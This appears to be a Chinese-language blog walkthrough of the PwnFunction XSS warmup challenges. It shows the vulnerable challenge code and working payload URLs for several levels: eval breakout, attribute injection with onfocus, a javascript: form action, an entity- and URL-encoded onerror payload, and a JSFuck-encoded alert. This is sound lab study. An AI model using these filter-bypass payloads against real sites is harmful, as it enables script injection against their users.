<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i,j,a,b;</span><br><span class="line">	i = <span class="string">&quot;3&quot;</span>;</span><br><span class="line">	j = <span class="string">&quot;4&quot;</span>;</span><br><span class="line">	a = j+i;</span><br><span class="line">	alert(a);</span><br><span class="line">》<span class="number">43</span></span><br><span class="line">	i1 = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">	j1 = <span class="string">&quot;b&quot;</span>;</span><br><span class="line">	b = j1+i1;</span><br><span class="line">	alert(b);</span><br><span class="line">》ba</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源URL：https://sandbox.pwnfunction.com/warmups/jefff.html</span><br><span class="line"></span><br><span class="line">修改后URL：https://sandbox.pwnfunction.com/warmups/jefff.html?jeff=&quot;-alert(1337);-&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;maname&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> jeff = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;jeff&#x27;</span>) || <span class="string">&quot;JEFFF&quot;</span>)</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> ma = <span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">eval</span>(<span class="string">`ma = &quot;Ma name <span class="subst">$&#123;jeff&#125;</span>&quot;`</span>)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        maname.innerText = ma</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="number">1000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看代码块，在加入<code>?jeff=&quot;-alert(1337);-&quot;</code>之后，ma变量就变为ma=“Ma name<code> &quot;-alert(1337);-&quot;</code>“</p>
<p>中间加黑部分为jeff变量，再仔细看会发现，ma变量变为==“Ma name”==-alert(1337);-==” “==。</p>
<p>JS为了进行<code>-</code>运算，会对每部分进行解析，在解析过程中会执行alert(1337);</p>
<p>一开始</p>
<p>![xss game6](D:\blog\H01iday\source_posts\pics\xss game6.png)</p>
<p>加入后，经过运算之后，==“Ma name”==-alert(1337);-==” “==得到结果NaN</p>
<p>![xss game5](D:\blog\H01iday\source_posts\pics\xss game5.png)</p>
<p>【如果是innerthtml中的字符串内部，使用”-“来使代码受到解析从而执行】</p>
<h1 id="3-Ugandan-Knuckles"><a href="#3-Ugandan-Knuckles" class="headerlink" title="3.Ugandan Knuckles"></a>3.Ugandan Knuckles</h1><ul>
<li><p>Difficulty is <strong>Easy</strong>.</p>
</li>
<li><p>Pop an <code>alert(1337)</code> on <code>https://sandbox.pwnfunction.com/warmups/da-wey.html</code>.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;uganda&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> wey = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;wey&#x27;</span>) || <span class="string">&quot;do you know da wey?&quot;</span>);</span></span><br><span class="line"><span class="javascript">    wey = wey.replace(<span class="regexp">/[&lt;&gt;]/g</span>, <span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">    uganda.innerHTML = <span class="string">`&lt;input type=&quot;text&quot; placeholder=&quot;<span class="subst">$&#123;wey&#125;</span>&quot; class=&quot;form-control&quot;&gt;`</span></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="知识清单：-2"><a href="#知识清单：-2" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
<li><p>placeholder 属性提供输入字段预期值的提示信息（hint）。该提示会在输入字段为空时显示，并会在字段获得焦点时消失。</p>
</li>
<li><p>HTML DOM属性对象 onfocus事件：当 input 输入框获取焦点时执行一段 Javascript代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onfocus=&quot;myFunction()&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>autofocus属性</p>
<p>autofocus 属性规定当页面加载时 input 元素应该自动获得焦点。</p>
<p>如果使用该属性，则 input 元素会获得焦点。</p>
</li>
</ol>
<h4 id="解决方法：-2"><a href="#解决方法：-2" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><p>从代码分析可以看到，wey被插入到input元素的属性中。由于对尖括号进行了过滤，则无法使用尖括号对input标签进行闭合，那么可以尝试用双引号闭合内部属性。</p>
<p>并添加onfocus属性来触发alert函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源URL：https://sandbox.pwnfunction.com/warmups/da-wey.html</span><br><span class="line"></span><br><span class="line">修改后URL：https://sandbox.pwnfunction.com/warmups/da-wey.html?wey=here is placeholder&quot; onfocus=&quot;alert(1337);&quot; autofocus=&quot;autofocus</span><br></pre></td></tr></table></figure>

<img src="D:\blog\H01iday\source\_posts\pics\xss game8.png" alt="xss game9" style="zoom:80%;" />

<p>一开始：</p>
<p>![xss game9](D:\blog\H01iday\source_posts\pics\xss game9.png)</p>
<p>url插入wey后：</p>
<p>![xss game7](D:\blog\H01iday\source_posts\pics\xss game7.png)</p>
<p>【注意：placeholder处不需要填写内容，我写了here is placeholder只是为了方便看，重要的是补的那个<code>&quot;</code>闭合了placeholder的属性；同理，autofocus也不是必要的，加上它只是它可以无需鼠标移动到输入框就可以聚焦到输入框，一直都自动聚焦到输入框；而单纯用onfocus的话需要手动移鼠标到输入框才可以触发alert。最重要的其实是注意格式，把<code>&quot;</code>双引号闭合了即可。】</p>
<p>【如果是html的属性内容，且过滤掉&lt;&gt;等敏感字符，那么可以通过” “,添加新的属性如onfocus等，利用新的属性来执行js代码】</p>
<h1 id="4-Ricardo-Milos"><a href="#4-Ricardo-Milos" class="headerlink" title="4.Ricardo Milos"></a>4.Ricardo Milos</h1><ul>
<li>Difficulty is <strong>Easy</strong>.</li>
<li>Pop an <code>alert(1337)</code> on <code>https://sandbox.pwnfunction.com/warmups/ricardo.html</code>.</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;ricardo&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;milos&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;True&quot;</span> <span class="attr">value</span>=<span class="string">&quot;True&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    ricardo.action = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;ricardo&#x27;</span>) || <span class="string">&#x27;#&#x27;</span>)</span></span><br><span class="line"><span class="javascript">    <span class="built_in">setTimeout</span>(<span class="function"><span class="params">_</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        ricardo.submit()</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="number">2000</span>)</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="知识清单：-3"><a href="#知识清单：-3" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
<li>form的action一般情况下代表提交表单到的页面，如果不填就相当于刷新当前页面。还有一种用法：action=JavaScript:xxxx;代表提交表单时执行xxxx的js代码。</li>
</ol>
<h4 id="解决方法：-3"><a href="#解决方法：-3" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">源URL：https://sandbox.pwnfunction.com/warmups/ricardo.html?milos=True#</span><br><span class="line">修改后URL：https://sandbox.pwnfunction.com/warmups/ricardo.html?milos=True#?ricardo=javascript:alert(1337);</span><br></pre></td></tr></table></figure>

<p>一开始，注意action的值</p>
<p>![xss game10](D:\blog\H01iday\source_posts\pics\xss game10.png)</p>
<p>修改后：</p>
<p>![xss game10](D:\blog\H01iday\source_posts\pics\xss game11.png)</p>
<p>【跟submit相关的可以直接将JavaScript代码当作action，即表单提交的地方，这样也可以直接执行js代码】</p>
<h1 id="5-Ah-That’s-Hawt"><a href="#5-Ah-That’s-Hawt" class="headerlink" title="5.Ah That’s Hawt"></a>5.Ah That’s Hawt</h1><ul>
<li><p>Difficulty is <strong>Easy</strong>.</p>
</li>
<li><p>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Challenge --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;will&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    smith = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;markassbrownlee&#x27;</span>) || <span class="string">&quot;Ah That&#x27;s Hawt&quot;</span>)</span></span><br><span class="line"><span class="javascript">    smith = smith.replace(<span class="regexp">/[\(\`\)\\]/g</span>, <span class="string">&#x27;&#x27;</span>)</span></span><br><span class="line"><span class="javascript">    will.innerHTML = smith</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="知识清单：-4"><a href="#知识清单：-4" class="headerlink" title="知识清单："></a><strong>知识清单：</strong></h4><ol>
<li>```<br>replace(/[(`)\]/g, ‘’)<br>第一：/pattern/是正则表达式的界定符，里面的内容即为要匹配的内容<br>第二：如果是单纯的replace(/[(`)\]/, ‘’)，只会替换第一个匹配的字符。如果加了g(全局标识)，可以替换掉全部匹配的字符<br>第三：\是转义的意思<br>综上，可以知道这句话的意思是，替换掉全部的 ( ) \ `<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. 浏览器解析顺序:URL 解析器-&gt;HTML 解析器-&gt; CSS 解析器-&gt;JS解析器</span><br><span class="line"></span><br><span class="line">#### **解决方法：**</span><br><span class="line"></span><br><span class="line">第一：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
alert(“1337”) ==&gt; 进行HTML实体编码（这里只对两个括号编码） ==&gt; alert&#x28;1337&#x29;”<br>编码网址：<a target="_blank" rel="noopener" href="https://mothereff.in/html-entities">https://mothereff.in/html-entities</a><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">第二：</span><br><span class="line"></span><br><span class="line">到控制台界面</span><br><span class="line"></span><br><span class="line">![hawt1](D:\blog\H01iday\source\_posts\pics\hawt1.png)</span><br><span class="line"></span><br><span class="line">可以看到 onerror的内容不完整</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;D:\blog\H01iday\source\_posts\pics\hawt2.png&quot; alt=&quot;hawt1&quot; style=&quot;zoom:180%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">可以看到在从‘#’开始部分都为hash部分</span><br><span class="line"></span><br><span class="line">原因：1. 从&quot;#&quot;开始到最后，都是锚部分。例如，如果你有一个 id 为 hello 的元素，则可以在 URL 中添加 #hello 就可以直接滚动到这个元素的位置上。</span><br><span class="line"></span><br><span class="line">​			2.?key1=value1&amp;key2=value2  ？后面跟查询参数，都是key-value pair；所以</span><br><span class="line"></span><br><span class="line">```url</span><br><span class="line">?markassbrownlee=&lt;img%20src=x%20onerror=&quot;alert&amp;#x28;1337&amp;#x29;&quot;&gt;</span><br><span class="line">url编码的时候会将&amp;两边的内容当作两个key-value pair 再加上考虑#则如下图所示</span><br></pre></td></tr></table></figure></li>
</ol>
<img src="D:\blog\H01iday\source\_posts\pics\hawt3.png" alt="hawt3" style="zoom:180%;" />

<p>综上，所以还需要进行url编码，也是对括号进行编码即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">echo</span> urlencode(<span class="string">&quot;&amp;#x28;&quot;</span>);<span class="comment">//%26%23x28%3B</span></span><br><span class="line">  <span class="keyword">echo</span> urlencode(<span class="string">&quot;&amp;#x29;&quot;</span>);<span class="comment">//%26%23x29%3B</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\hawt4.png" alt="hawt4"></p>
<p><strong>存在的疑惑：</strong></p>
<p>为什么要先进行html编码在进行url编码？可不可以直接进行url编码</p>
<p>尝试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&quot;alert(1337)&quot;</span>);<span class="comment">//alert%281337%29</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\hawt5.png" alt="hawt5"></p>
<p>询问老师：</p>
<p><code>直接url编码不行，因为解码后js判断出来是括号过滤了</code></p>
<h1 id="6-Ninja-has-Ligma"><a href="#6-Ninja-has-Ligma" class="headerlink" title="6.Ninja has Ligma"></a>6.Ninja has Ligma</h1><ul>
<li><p>Difficulty is <strong>Easy</strong>.</p>
</li>
<li><p>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Challenge */</span></span><br><span class="line">balls = (<span class="keyword">new</span> URL(location).searchParams.get(<span class="string">&#x27;balls&#x27;</span>) || <span class="string">&quot;Ninja has Ligma&quot;</span>)</span><br><span class="line">balls = balls.replace(/[A-Za-z0-<span class="number">9</span>]/g, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">eval</span>(balls)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="知识清单：-5"><a href="#知识清单：-5" class="headerlink" title="知识清单："></a><strong>知识清单</strong>：</h4><ol>
<li><p><em>JSFuck</em> 可以让你只用 6 个字符[]()!+ 来编写 JavaScript 程序。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br><span class="line">==&gt;</span><br><span class="line">JSFuck编码</span><br><span class="line">[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</span><br></pre></td></tr></table></figure></li>
<li><p>+号的特别：在用户提交的表单字段，如果有空格，会被转化为+字；服务器解析时会认为+号代表空格</p>
<p>特殊字符都需要进行url编码，url出现了有+，空格，/，?，%，#，&amp;，=等特殊符号的时候，能在服务器端无法获得正确的参数值</p>
<p>如+再URL表示空格，那么如果要表示‘+’本身就要通过转义用%2B 来表示加号</p>
</li>
</ol>
<h4 id="解决方法：-4"><a href="#解决方法：-4" class="headerlink" title="解决方法："></a><strong>解决方法：</strong></h4><p>第一：js过滤掉了a-zA-Z0-9所以，没办法直接用alert(1337)</p>
<p>第二：那么可以通过JSFuck对内容进行alert(1337)部分进行编码</p>
<img src="D:\blog\H01iday\source\_posts\pics\Ligma1.png" alt="Ligma1" style="zoom:67%;" />

<p>第三：这样还不够，因为JSFuck中含有+号，在URL中+号表示空格，所以为了能正确表示，要对JSFuck之后的内容再进行URL编码</p>
<img src="D:\blog\H01iday\source\_posts\pics\Ligma2.png" alt="Ligma2" style="zoom: 67%;" />

<p>第四：</p>
<p><img src="D:\blog\H01iday\source_posts\pics\Ligma3.png" alt="Ligma3"></p>
<h1 id="7-Mafia"><a href="#7-Mafia" class="headerlink" title="7.Mafia"></a>7.Mafia</h1><ul>
<li>Difficulty is <strong>Easy</strong>.</li>
<li>Pop an <code>alert(1337)</code> on <code>sandbox.pwnfunction.com</code>.</li>
</ul>
<p>![xss game12](D:\blog\H01iday\source_posts\pics\xss game12.png)</p>
<h4 id="知识清单：-6"><a href="#知识清单：-6" class="headerlink" title="知识清单："></a>知识清单：</h4><ul>
<li><p>​    atob(encodedString)函数</p>
<p>​    该函数解码base-64编码的<strong>字符串</strong></p>
</li>
<li><p>​    String.fromCharCode(unicode)函数</p>
<p>​    接收unicode值，然后返回字符串</p>
<p>​    例：</p>
<img src="D:\blog\H01iday\source\_posts\pics\xss game13.png" alt="xss game13" style="zoom: 67%;" />

<p>​    </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	<span class="keyword">var</span> val=<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>);</span><br><span class="line">	alert(val); <span class="comment">//alert</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>RegExp(pattern,modifiers)对象</p>
<p>pattern：表达式的模式</p>
<p>modifiers[修饰符]：指定全局匹配、区分大小写匹配、多行匹配</p>
<table>
<thead>
<tr>
<th align="left">修饰符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">i</td>
<td align="left">执行对大小写不敏感的匹配。</td>
</tr>
<tr>
<td align="left">g</td>
<td align="left">执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。</td>
</tr>
<tr>
<td align="left">m</td>
<td align="left">执行多行匹配。</td>
</tr>
</tbody></table>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">var</span> patt=<span class="keyword">new</span> <span class="built_in">RegExp</span>(pattern,modifiers);</span><br><span class="line"><span class="keyword">var</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&quot;\\w+&quot;</span>); 查找数字、字母、下划线至少一个匹配</span><br><span class="line"></span><br><span class="line">或者更简单的方式:</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> patt=<span class="regexp">/pattern/m</span>odifiers;</span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/\w+/</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>source属性</p>
<p>RegExpObject.source</p>
<p>返回[正则]模式匹配所用的文本</p>
<p>例：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      <span class="keyword">var</span> pattern1 = <span class="regexp">/hey/g</span>;</span><br><span class="line">      <span class="built_in">document</span>.write(<span class="string">&quot;The text of the RegExp is: &quot;</span>+pattern1.source);<span class="comment">//output:hey</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>parseInt(string, radix)</p>
<p>解析字符串，并返回整数</p>
<p>string：要解析的字符串</p>
<p>radix：要解析的数字<strong>基数</strong>2-36</p>
<p>有点抽象，举个栗子</p>
<p>parseInt(“f”, 16)&gt;&gt;&gt;&gt;15</p>
<p>就是说f在16进制中代表的整数为15</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;alert&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">\\output：<span class="number">8680439</span></span><br><span class="line">解析：</span><br><span class="line"><span class="number">1.</span> 为什么选择<span class="number">30</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;t&#x27;</span>,<span class="number">30</span>)</span><br><span class="line">	\\output:<span class="number">29</span>  要选择一个t有表示值的基数，基数为<span class="number">30</span>时t为最大值<span class="number">29</span>，故要选择基数大于等于<span class="number">30</span>,而且小于<span class="number">36</span>[函数规定]</span><br><span class="line"><span class="number">2.</span> <span class="number">8680439</span>这个值是怎么来的</span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">30</span>):<span class="number">10</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;l&#x27;</span>,<span class="number">30</span>):<span class="number">21</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;e&#x27;</span>,<span class="number">30</span>):<span class="number">14</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;r&#x27;</span>,<span class="number">30</span>):<span class="number">27</span></span><br><span class="line">	<span class="built_in">parseInt</span>(<span class="string">&#x27;t&#x27;</span>,<span class="number">30</span>):<span class="number">29</span></span><br><span class="line">	<span class="number">8680439</span>=<span class="number">10</span>*<span class="number">30</span>^<span class="number">4</span>+<span class="number">21</span>*<span class="number">30</span>^<span class="number">3</span>+<span class="number">14</span>*<span class="number">30</span>^<span class="number">2</span>+<span class="number">27</span>*<span class="number">30</span>+<span class="number">29</span>		</span><br></pre></td></tr></table></figure>

<ul>
<li><p>toString(radix)函数</p>
<p>number.toString(radix)把数字转化为字符串</p>
<p>radix：基数</p>
</li>
<li><p>url中的#说明</p>
<p>#锚点：浏览器读取该url时会自动滚动至#指定区域</p>
<p>#是用来指导浏览器动作的，对服务器端完全无用。HTTP请求中不包括#。即#后的内容不会发送给服务器端</p>
<p>#内容的修改不会导致页面重新加载，只会切换位置</p>
<p>#内容的改变会导致浏览器访问历史的改变  即#改变后 点击后退返回的是#改变前的位置</p>
</li>
<li><p>number.toString(radix)eval(Function(alert(1337))());这是什么语法？！</p>
</li>
</ul>
